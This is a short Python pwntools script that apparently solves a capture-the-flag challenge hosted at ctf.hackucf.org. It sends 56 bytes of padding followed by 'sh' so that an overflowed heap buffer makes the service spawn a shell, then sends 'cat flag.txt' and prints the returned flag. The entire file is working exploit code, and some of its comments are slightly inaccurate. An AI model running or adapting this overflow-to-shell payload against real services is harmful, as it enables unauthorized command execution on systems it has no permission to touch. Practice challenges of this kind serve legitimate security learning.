from pwn import *

io = remote("ctf.hackucf.org", 7003)
io.recvuntil("username:")
# we have a file allocating 56 bytes in the heap and then it will execute /bin/\x57\x58
payload = cyclic(56) 
payload += bytes('sh', 'utf-8')
# create payload with 56 random bits and then our payload which is cat flag.txt
io.sendline(payload)
io.sendline(b'cat flag.txt')
# Recieve flag and neatly print it out
treasure = io.recvuntil('}')
treasure = treasure[86:]
print("\n")
print(treasure)
